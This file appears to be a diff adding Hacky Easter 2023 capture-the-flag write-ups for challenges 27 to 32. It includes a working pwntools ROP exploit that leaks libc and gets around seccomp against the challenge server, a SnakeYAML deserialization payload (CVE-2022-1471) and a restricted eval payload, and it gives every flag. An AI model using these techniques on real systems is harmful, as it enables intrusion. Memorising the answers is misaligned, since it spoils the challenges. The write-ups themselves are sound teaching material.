@@ -1,0 +1,642 @@
+= [HE23.27] Custom Keyboard
+
+image::level7/challenge27.jpg[,300,float="right"]
+
+== Intro
+Thumper built his first custom keyboard. He chose all the parts
+separately and in the end even adjusted the firmware.
+
+Apparently, there's a flag hidden inside it. Can you find it?
+
+File  ``custom_keyboard.elf``
+
+🚩 Flag
+
+* lowercase and _ only
+* example: he2023{example_flag_only}
+
+== Solution
+The elf file was produced using gcc for avr8, so use these settings to analyse it in Ghidra.  It is quite a lot of code to sift through since the whole qmk-libraries are included as well...
+
+Luckily, there is a data section called ``flags_leds.8`` which seems to be promising:
+
+                       flag_leds.8
+  mem:0216 22 18 0b        undefine
+           03 0b 0a 
+           10 1f 18 
+     mem:0216 22  undefined1  22h [0]
+     mem:0217 18  undefined1  18h [1]
+     mem:0218 0b  undefined1  0Bh [2]
+     mem:0219 03  undefined1  03h [3]
+     mem:021a 0b  undefined1  0Bh [4]
+     mem:021b 0a  undefined1  0Ah [5]
+     mem:021c 10  undefined1  10h [6]
+     mem:021d 1f  undefined1  1Fh [7]
+     mem:021e 18  undefined1  18h [8]
+     mem:021f 25  undefined1  25h [9]
+     mem:0220 26  undefined1  26h [10]
+     mem:0221 02  undefined1  02h [11]
+     mem:0222 1f  undefined1  1Fh [12]
+     mem:0223 13  undefined1  13h [13]
+     mem:0224 23  undefined1  23h [14]
+     mem:0225 22  undefined1  22h [15]
+     mem:0226 16  undefined1  16h [16]
+     mem:0227 02  undefined1  02h [17]
+     mem:0228 16  undefined1  16h [18]
+     mem:0229 22  undefined1  22h [19]
+     mem:022a 18  undefined1  18h [20]
+     mem:022b 02  undefined1  02h [21]
+     mem:022c 19  undefined1  19h [22]
+     mem:022d 27  undefined1  27h [23]
+     mem:022e 15  undefined1  15h [24]
+     mem:022f 0f  undefined1  0Fh [25]
+
+26 characters seem to be ok, and starting with a crib of "he2023{" it also is
+promising that the 2 is always represented as 0x0b.  So start to develop a
+mapping and print the decoded flag.  The value 0x02 is repeated several
+times, so it is likely the ``_``.  Then bootstrap from there: `` he`` is very
+likely ``the`` and since it is about leds, ``l`` as the first character also
+makes sense.
+
+Then it only takes some imagination to find ``he2023{leds_light_the_way}``
+
+[source,python]
+----
+msg = [0x22, 0x18, 0x0b, 0x03, 0x0b, 0x0a, 0x10, 0x1f,
+0x18, 0x25, 0x26, 0x02, 0x1f, 0x13, 0x23, 0x22,
+0x16, 0x02, 0x16, 0x22, 0x18, 0x02, 0x19, 0x27,
+0x15, 0x0f]
+
+mapping = { 0x22: 'h', 0x18: 'e', 0xb: '2', 0x03: '0',
+           0x0a: '3', 0x10: '{', 0x0f: '}', 0x02: '_',
+           0x16: 't', 0x1f: 'l', 0x25: 'd', 0x26: 's'}
+
+for i in msg:
+    if i in mapping:
+        print(f"{mapping[i]}, {ord(mapping[i]):08b} ", end ='')
+    else:
+        print(" ,          ", end ='')
+    print(f"{i:3d} 0x{i:02x}, {i:08b}b")
+
+
+for i in msg:
+    if i in mapping:
+        print(f"{mapping[i]}", end ='')
+    else:
+        print(" ", end ='')
+
+print()
+----
+
+Finding the true mapping is left as an exercise to the reader :-)
+
+= [HE23.28] Thumper's PWN - Ring 2 
+
+image::level7/challenge28.jpg[,300,float="right"]
+
+== Intro
+Thumper got one step closer to Dr. Evil but there's still a lot he has to
+learn. That's why he's practicing the ancient art of ROP. Help him solve this
+challenge by reading the file FLAG, so he can be on his way.
+
+Target: `nc ch.hackyeaster.com 2314`
+
+Note: The service is restarted every hour at x:00.
+
+File: `thumperspwn2.zip`
+
+== Solution
+We are given a binary and also the source code to it:
+
+[source,c]
+----
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <stdbool.h>
+
+#include "seccomp-bpf.h"
+
+bool sec_done = false;
+
+void activate_seccomp()
+{
+    struct sock_filter filter[] = {
+        VALIDATE_ARCHITECTURE,
+        EXAMINE_SYSCALL,
+
+        ALLOW_SYSCALL(mprotect),
+        ALLOW_SYSCALL(mmap),
+        ALLOW_SYSCALL(munmap),
+        ALLOW_SYSCALL(exit_group),
+        ALLOW_SYSCALL(read),
+        ALLOW_SYSCALL(write),
+        ALLOW_SYSCALL(open),
+        ALLOW_SYSCALL(close),
+        ALLOW_SYSCALL(openat),
+        ALLOW_SYSCALL(brk),
+        ALLOW_SYSCALL(newfstatat),
+        ALLOW_SYSCALL(fstat),
+        ALLOW_SYSCALL(ioctl),
+        ALLOW_SYSCALL(lseek),
+        KILL_PROCESS,
+    };
+
+    struct sock_fprog prog = {
+        .len = (unsigned short)(sizeof(filter) / sizeof(struct sock_filter)),
+        .filter = filter,
+    };
+
+    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
+    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &prog);
+    sec_done = true;
+}
+
+void vuln() {
+  char buf[32];
+  printf("Are you a master of ROP?\n");
+  printf("Show me what you can do: ");
+  gets(buf);
+}
+
+void main() {
+  setbuf(stdout, NULL);
+  setbuf(stdin, NULL);
+
+  if (!sec_done) {
+    activate_seccomp();
+  }
+
+  vuln();
+}
+----
+
+At first sight, it is a classic buffer overflow problem: `gets` can be used to
+overflow `buf` and so write to the stack.  When `vuln` returns we can have it
+do whatever we want.  But since seccomp is used, not all system calls are
+available and we cannot get a shell.  `read` and `open` are available though
+and we can list directories and files.
+
+So the plan is as usual: find the offset needed to overwrite the return
+address, then leak some library function addresses to identify the used libc
+and later on to determine the libc-offset.  Then we can start to craft the real
+attack.
+
+The attack tries to open the flag-file and then read from it.  The filename was
+found by guessing a few likely candidates and then it was assumed that the
+opened file would have a file-descriptor of 3.  Then we can read repeatedly
+from the file to a memory location and print the read data using puts.  In
+`.bss` there is room for some data (about 0x30), so just experiment with
+multiple reads once it is clear that file `FLAG` is the desired file. The final
+script to read the flag looks like this:
+
+[source,python]
+----
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# This exploit template was generated via:
+# $ pwn template --host ch.hackyeaster.com --port 2314 ./main
+from pwn import *
+
+# Set up pwntools for the correct architecture
+exe = context.binary = ELF('./main')
+host = args.HOST or 'ch.hackyeaster.com'
+port = int(args.PORT or 2314)
+
+def start_local(argv=[], *a, **kw):
+    '''Execute the target binary locally'''
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+def start_remote(argv=[], *a, **kw):
+    '''Connect to the process on the remote host'''
+    io = connect(host, port)
+    if args.GDB:
+        gdb.attach(io, gdbscript=gdbscript)
+    return io
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.LOCAL:
+        return start_local(argv, *a, **kw)
+    else:
+        return start_remote(argv, *a, **kw)
+
+# Specify your GDB script here for debugging
+# GDB will be launched if the exploit is run via e.g.
+# ./exploit.py GDB
+gdbscript = '''
+tbreak main
+continue
+'''.format(**locals())
+
+#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+# Arch:     amd64-64-little
+# RELRO:    Partial RELRO
+# Stack:    No canary found
+# NX:       NX enabled
+# PIE:      No PIE (0x400000)
+
+"""
+ropper --nocolor --file /usr/lib/x86_64-linux-gnu/libc.so.6 | grep 'pop rax; ret;'                       
+
+0x000000000003f0a7: pop rax; ret; 
+0x00000000001346e6: pop rdi; ret;
+0x0000000000028ed9: pop rsi; ret; 
+0x00000000000fdc9d: pop rdx; ret; 
+0x0000000000026428: syscall; 
+"""
+
+
+rop = ROP(exe)
+rop.raw(cyclic(cyclic_find('kaaa', n=4), n=4))
+rop.call(exe.symbols['puts'], [exe.got['puts']])
+rop.call(exe.symbols['puts'], [exe.got['printf']])
+rop.call(exe.symbols['puts'], [exe.got['gets']])
+rop.call(exe.symbols['puts'], [exe.got['prctl']])
+rop.call(exe.symbols['puts'], [exe.got['setbuf']])
+rop.call(exe.symbols['main'])
+
+# shellcode = asm(shellcraft.sh())
+# rop.main()
+
+io = start()
+log.info(rop.dump())
+io.sendline(rop.chain())
+# get the leaked address of ASLR puts() in libc in the server
+io.recvuntil(b"\n")
+io.recvuntil(b": ")
+tmp = io.recvuntil(b"\n").rstrip()
+leaked_addr_puts_libc = u64(tmp.ljust(8, b"\x00"))
+log.info("Leaked server's libc address, puts(): " + hex(leaked_addr_puts_libc))
+leaked_addr_printf_libc = u64(io.recvuntil(b"\n").rstrip().ljust(8, b"\x00"))
+log.info("Leaked server's libc address, printf(): " + hex(leaked_addr_printf_libc))
+leaked_addr_gets_libc = u64(io.recvuntil(b"\n").rstrip().ljust(8, b"\x00"))
+log.info("Leaked server's libc address, gets(): " + hex(leaked_addr_gets_libc))
+leaked_addr_prctl_libc = u64(io.recvuntil(b"\n").rstrip().ljust(8, b"\x00"))
+log.info("Leaked server's libc address, prctl(): " + hex(leaked_addr_prctl_libc))
+leaked_addr_setbuf_libc = u64(io.recvuntil(b"\n").rstrip().ljust(8, b"\x00"))
+log.info("Leaked server's libc address, setbuf(): " + hex(leaked_addr_setbuf_libc))
+
+if args.LOCAL:
+    """
+    symbols from the local libc (identified from leaked addresses):
+
+    open 00000000000f7d40  # this seems to be incorrect and should be d20...
+    00000000000f7d20 <__open_2@@GLIBC_2.7>:
+
+    read 00000000000f8020
+
+    open 00000000000f7e00
+    read 00000000000f80e0
+    fopen 0000000000076170
+
+    puts 0000000000077820
+    printf 0000000000052450
+    gets 0000000000076f30
+
+    gadget for rdx from libc (ROPgadget):
+    0x00000000000fdc9d: pop rdx; ret;
+    0x00000000000352ec : mov qword ptr [rdx], rax ; ret
+    """
+    libc_path = '/usr/lib/x86_64-linux-gnu/libc.so.6'
+    addr_printf = 0x52450
+    addr_open = 0xf7d20 - addr_printf + leaked_addr_printf_libc
+    addr_fopen = 0x76170 - addr_printf + leaked_addr_printf_libc
+    addr_read = 0xf8030 -  addr_printf + leaked_addr_printf_libc
+    pop_rdx_addr = 0xfdc9d  -  addr_printf + leaked_addr_printf_libc
+    pop_rax_addr = 0x3f0a7  -  addr_printf + leaked_addr_printf_libc
+    write_rdx_rax_addr = 0x352ec  -  addr_printf + leaked_addr_printf_libc
+
+else:
+    """
+    symbols from the remote libc (identified from leaked addresses):
+    open 000000000010fbf0
+    read 0000000000110020
+
+    printf 0000000000064e40
+
+    gadget for rdx from libc (ROPgadget):
+    0x0000000000001b96: pop rdx; ret;  
+    0x000000000001b500: pop rax; ret; 
+    0x000000000003099c : mov qword ptr [rdx], rax ; ret
+    """
+    addr_printf = 0x64e40
+    addr_open = 0x10fbf0 - addr_printf + leaked_addr_printf_libc
+    addr_read = 0x110020 -  addr_printf + leaked_addr_printf_libc
+
+    pop_rdx_addr = 0x1b96  -  addr_printf + leaked_addr_printf_libc
+    pop_rax_addr = 0x1b500  -  addr_printf + leaked_addr_printf_libc
+    write_rdx_rax_addr = 0x3099c  -  addr_printf + leaked_addr_printf_libc
+
+# data_addr is where we want to write the file name to (.bss)
+data_addr = p64(0x601030)
+
+rop = ROP(exe)
+from pwnlib.rop.rop import Gadget
+rop.gadgets[pop_rdx_addr] = Gadget(pop_rdx_addr,
+    ['pop rdx', 'ret'], ['rdx'], 0x10)
+rop.gadgets[pop_rax_addr] = Gadget(pop_rax_addr,
+    ['pop rax', 'ret'], ['rax'], 0x10)
+rop.gadgets[write_rdx_rax_addr] = Gadget(write_rdx_rax_addr,
+    ['mov qword ptr [rdx], rax', 'ret'], ['[rdx]', 'rax'], 0x10)
+
+rop.raw(cyclic(cyclic_find('kaaa', n=4), n=4))
+
+# write the filename to data_addr
+rop(rdx=data_addr)
+rop(rax=b'FLAG\x00$$$')
+rop.call(write_rdx_rax_addr)
+rop(rdi=data_addr)
+rop.call(exe.symbols['puts'])
+# now open the file
+rop(rax=0x0)
+rop(rdx=0x0)
+rop(rsi=0x0)
+rop(rdi=data_addr)
+rop.call(addr_open)
+# do five calls to read data from the file, write to data_addr
+# and print using puts
+for _ in range(5):
+    rop(rdi=0x3)
+    rop(rsi=data_addr)
+    rop(rdx=0x30)
+    rop.call(addr_read)
+    rop(rdi=data_addr)
+    rop.call(exe.symbols['puts']) 
+rop.call(exe.symbols['main'])
+
+log.info(rop.dump())
+io.sendline(rop.chain())
+io.interactive()
+----
+
+The output looks like:
+
+  [*] Switching to interactive mode
+  Are you a master of ROP?
+  Show me what you can do: FLAG
+  Unfortunately, no one can be told what the Matri
+  x is.
+  You have to see it for yourself.
+  This is y
+  our last chance.
+  After this there is no turning
+  back.
+  
+  Here is your flag:
+  
+  he2023{N0t_bad_y0u_by
+  pa$$ed_th3_s3c_f1lt3r}
+
+So the flag is `he2023{N0t_bad_y0u_bypa$$ed_th3_s3c_f1lt3r}`
+
+= [HE23.29] Coney Island Hackers 2
+
+image::level7/challenge29.jpg[,300,float="right"]
+
+== Intro
+Coney Island Hackers are back!
+
+They changed the passphrase of their secret web portal to: ``coneʸisland``.
+
+However, they implemented some protection:
+
+* letters and some special characters are not allowed
+* maximum length of the string entered is 75
+
+http://ch.hackyeaster.com:2302
+
+Note: The service is restarted every hour at x:00.
+
+=== Hint
+``eval``
+
+== Solution
+The problem sounds like it could be solved with http://www.jsfuck.com/, but it
+needs to be shortened to fit with the 75 character limit.  We also note that
+some non-ASCII characters are allowed (the y in coneyislang).  So we can create
+a variable containing a string and concatenate letters from this string.
+
+  ä=[!1]+[][0]+''+{};  // "falseundefined[object Object]"
+
+So using this variable ``ä`` we have all letters needed and can build the password 
+
+  ä[19]+ä[15]+ä[6]+ä[4]+"ʸ"+ä[10]+ä[3]+ä[2]+ä[1]+ä[6]+ä[7]
+
+Put together, these are exactly 75 characters and can be entered to get the
+flag ``he2023{fun_w1th_ev1l_ev4l_1n_nyc}``
+
+=== Notes
+https://github.com/aemkei/jsfuck
+
+= [HE23.30] Digital Snake Art
+
+image::level7/challenge30.jpg[,300,float="right"]
+
+== Intro
+I'm a big fan of digital art!
+
+How do you like my new gallery?
+
+File: ``digitalsnakeart.zip``
+
+http://ch.hackyeaster.com:2307
+
+Note: The service is restarted every hour at x:00.
+
+== Solution
+The file contains part of the source code to the service.  From this source code we learn that there is a flag hidden somewhere, Flag being a subclass of Image.
+
+To look at an image, a base64 encoded YAML file is sent to the service.  An example is:
+
+  name: Snake and Rabbit Being Friends
+  image: snake_and_rabbit_being_friends
+  source: DALL-E
+  resolution: 256x256
+
+From the source code we see that SnakeYAML is used to create the objects from the YAML and this library has a known vulnerabilty (CVE-2022-1471).  This vulnerability allows to generate any object within the classpath and in this case allows us to create a flag object.
+
+Flag takes a code as argument, code is of type Code and the code is set via the constructor.  From the source code we can learn that it must be between 0 and 500:
+
+[source,java]
+----
+package com.hackyeaster.digitalsnakeart;
+
+public class Code {
+
+    private final short code;
+
+    public Code(short code) {
+        this.code = code;
+    }
+
+    public boolean isCorrect() {
+        return (code > 0 && code < 500 && code == SnakeService.getSecretCode());
+    }
+
+}
+----
+
+The idea is now to generate a request to create a flag and the brute force the code.  After some experimenting, this payload was found effective:
+
+  name: Snake as a Super Hero
+  image: !!com.hackyeaster.digitalsnakeart.Flag [!!com.hackyeaster.digitalsnakeart.Code [ 198 ] ]
+  source: DALL-E
+  resolution: 256x256
+
+Success can be juged by the image returned:
+
+image::level7/198.png[,300,float="right"]
+image::level7/199.png[,300,float="left"]
+
+The flag is ``he2023{0n3_d03s_n0t_s1mply_s0lv3_th1s_chllng!}``
+
+
+= [HE23.31] Fruity Cipher
+
+image::level7/challenge31.jpg[,300,float="right"]
+
+== Intro
+
+I found this fruity message. Can you decrypt it?
+
+   🥦🥝🍋🍊🥭🍌🫑🧅 🧅🥝🥖 🍉🍠🥬🫐 🍉🫐🥔🥥🍈 🥔🍌🥝🥖🍏 🥐🍍🥦🍉🍇🥥🍋 🥑🍉🍍🥐🍉 🍅🍠🥦 🍋🥭🍓🍐🌶🍇 🥕🌶🥔🥭🍓🍏🍒🍆🍏 🌶🫐🍎🍏🍒🥥🍊 🍎🥝 🍅🥝🥥🍇 🍎🍉🥔🍓 🥝🍓🍇 🥐🥭🥦🍉🍇🥥🍏🫐🍆🍎 🌶🫐🍎🍏🍇🥥🍋 🍎🍉🍇🍊🫐 🍠🥥🍒 🥐🍠🌶🫑🫐🍈 🍉🥝🍅🥝🥦🍉🥝🍓🍍🥐 🥐🍍🥕🍉🫐🥥🍋 🍏🍉🍇 🍋🥝🫑🥖🍏🍍🥝🍓 🥭🍋 🍉🧅🥦🍒🥥🥬🥭🍏🍠🍅🥭🍓🥝🍋🥭🍊
+
+image::level7/fruity_cipher.png[,650,]
+
+🚩 Flag
+
+* lowercase only, no spaces
+* wrap into he2023{ and }
+* example: he2023{exampleflagonly}
+
+=== Hints
+
+* the plaintext consist of lowercase letters (and spaces) only
+* there are more than 26 symbols
+* 🍏 == 🍎
+
+== Solution
+
+It is very likely a homophonic substitution cipher, so convert it to a
+uppercase alphabeth and start bootstrapping using short words.  To aid it, a
+simple progam was written to test out the substitutions.  The final run is
+shown here:
+
+  _ python .\solve31.py
+  {'🥦': 'A', '🥝': 'B', '🍋': 'C', '🍊': 'D', '🥭': 'E', '🍌': 'F',
+   '🫑': 'G', '🧅': 'H', ' ': ' ', '🥖': 'I', '🍉': 'J', '🍠': 'K', 
+   '🥬': 'L', '🫐': 'M', '🥔': 'N', '🥥': 'O', '🍈': 'P', '🍎': 'Q', 
+   '🥐': 'R', '🍍': 'S', '🍇': 'T', '🥑': 'U', '🍅': 'V', '�'': 'W', 
+   '🍐': 'X', '🌶': 'Y', '🥕': 'Z', '🍒': '1', '🍆': '2'}
+  ABCDEFGH HBI JKLM JMNOP NFBIQ RSAJTOC UJSRJ VKA CEWXYT ZYNEWQ12Q YMQQ1OD
+  QB VBOT QJNW BWT REAJTOQM2Q YMQQTOC QJTDM KO1 RKYGMP JBVBAJBWSR RSZJMOC 
+  QJT CBGIQSBW EC JHA1OLEQKVEWBCED
+  {'A': 6, 'B': 12, 'C': 8, 'D': 4, 'E': 8, 'F': 2, 'G': 3, 'H': 3, 
+   ' ': 25, 'I': 3, 'J': 13, 'K': 5, 'L': 2, 'M': 8, 'N': 4, 'O': 9, 
+   'P': 2, 'Q': 15, 'R': 6, 'S': 5, 'T':  8, 'U': 1, 'V': 4, 'W': 7, 
+   'X': 1, 'Y': 5, 'Z': 2, '1': 4, '2': 2}
+  possibly you have heard about ciphers which map single plaintext letters
+  to more than one ciphertext letters these are called homophonic ciphers
+  the solution is hypervitaminosis
+
+Flag: ``he2023{hypervitaminosis}``
+
+= [HE23.32] Kaos Motorn
+
+image::level7/challenge32.jpg[,300,float="right"]
+
+== Intro
+What?
+Is?
+This?
+Kaos?
+
+=== Hint
+Inputs are in the range 0..9.
+
+== Solution
+The link presented takes us to a Google spreadsheet that looks quite funny
+(here the flag is already visible):
+
+image::level7/flag32.png[,400,]
+
+Analysing the formulas and copying them into a python file allows us to brute force the keyword.
+
+[source, python]
+----
+def MOD(n1,n2):
+    return n1 % n2
+
+def CHAR(n):
+    try:
+        return chr(n)
+    except Exception:
+        return ' '
+
+def kaos(E2,F2,J6,B7,D14,G14):
+    F12=MOD(E2*B7+D14,64)
+    C3=(J6+B7+34+G14)%64
+    H3=(B7*J6*7)%64
+    B13=MOD(B7*J6*G14+5,64)
+    F4=(E2*G14+D14+J6)%64
+    D5=(E2+J6+B7+D14+G14)%64
+    J13=MOD(D14+B7*E2,64)
+    I5=(H3+D5)%64
+    G6=MOD(G14*B7+D14,64)
+    C6=MOD(H3+G6+B13+3,64)
+    D11=MOD(E2*G14,64)
+
+    J3=(F12+D11+D5+F4)%64
+    I7=MOD(F12+D11*G6+H3,64)
+    F10=MOD(J13+F12+D11+F4+17,64)
+    I10=MOD(J6*G14+B7,64)
+    B5=(J13+D11+F12+I10)%64
+    E6=MOD(F4+D11+I10,64)
+    H11=MOD(C3+H3+F12,64)
+    C12=MOD(B13+F12+I10,64)
+    H13=MOD(H3+G6+F12+D11+B13+B13,64)
+
+    ## OUTPUT???
+    B8=CHAR(52+B5)
+    C8=CHAR(44+I7)
+    D8=CHAR(48+J3)
+    E8=CHAR(45+E6)
+    F8=CHAR(42+I5)
+    G8=CHAR(63-F10)
+    H8=CHAR(H13+93)
+    I8=CHAR(C12+68)
+    J8=CHAR(H13+74)
+    B9=CHAR(I7-5)
+    C9=CHAR(C6*6+2)
+    D9=CHAR(I7+B5+J6-34)
+    E9=CHAR(91-C12)
+    F9=CHAR(I7+H11-10)
+    G9=CHAR(B5-4)
+    H9=CHAR(H11+H13+I5+J3)
+    I9=CHAR(H13+E6)
+    J9=CHAR(E6*H11-25)
+    return B8+C8+D8+E8+F8+G8+H8+I8+J8+B9+C9+D9+E9+F9+G9+H9+I9+J9
+
+
+import itertools
+for n1, n2 in itertools.product(range(10), range(10)):
+    for n3, n4, n5, n6 in itertools.product(range(10), range(10), range(10), range(10)):
+        flag = kaos(n1,n2,n3,n4,n5,n6)
+        if flag[:6] == "he2023":
+            print(n1,n2,n3,n4,n5,n6)
+            print(flag)
+            exit()
+    print(n1,n2)
+----
+
+This prints 
+  8 0 8 2 1 5
+  he2023{Th4tSKa0Z!}
